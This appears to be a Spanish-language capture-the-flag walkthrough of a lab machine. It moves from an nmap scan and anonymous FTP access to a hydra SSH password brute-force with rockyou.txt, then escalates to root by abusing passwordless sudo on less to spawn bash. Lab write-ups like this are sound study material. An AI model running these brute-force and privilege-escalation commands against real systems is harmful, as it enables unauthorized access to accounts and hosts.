### namp
```python 
PORT     STATE    SERVICE      VERSION
21/tcp   open     ftp          vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.203.6
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
22/tcp   open     ssh          OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
80/tcp   open     http         Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
1002/tcp filtered windows-icfw
1057/tcp filtered startron
2135/tcp filtered gris
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

### puerto 21 ftp abierto y missconfigure con anonymous

tenemos un archivo
```css 
	From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine

```
este archivo nos da 3 usuarios 
```java
	Username: Amy
	Username: Jake
	Username: holt
```

### aplicamos fuerza bruta con hydra 
```python
hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh
```
![[Pasted image 20231107001617.png]]
### ingresamos por ssh con las credenciales que hemos conseguido
![[Pasted image 20231107002238.png]]
en la rita /home/holt podemo conseguir la flag user.txt

### vamos a escalar privilegios
buscaremos permisos SUID
```java 
	find / -perm -u=s -type f 2>/dev/null
```
podemos ver un direcctorio /usr/bin/less hacemos sudo -l
![[Pasted image 20231107005512.png]]

### el usuario jake puede ejecutar todo con lo que quiera con (ALL) /usr/bin/less con el directorio less sin proporcionar contraseña NOPASSWD

```python 
	sudo less /etc/profile
```
debido a que podemos ejecutar less como sudo. podemos crear un archivo de texto y seguido de esto podemos decirle
```python
	!/bin/bash
```
### WE ARE ROOT